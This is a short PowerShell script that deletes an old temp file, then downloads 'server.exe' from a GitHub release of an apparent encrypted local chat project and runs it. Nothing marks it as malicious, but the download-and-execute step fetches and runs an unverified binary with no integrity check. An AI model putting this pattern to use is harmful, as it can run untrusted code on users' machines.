$FileName = $env:temp + "/myexe.exe"

if (Test-Path $FileName) {
  Remove-Item $FileName
  write-host "$FileName has been deleted"
}
else {
  Write-host "$FileName doesn't exist"
}

$o = "$env:temp\myexe.exe"
(New-Object System.Net.WebClient).DownloadFile("https://github.com/jostanise/rsa_encrypted_local_chat/releases/download/v1.0/server.exe", $o)
Start-Process -Filepath $o
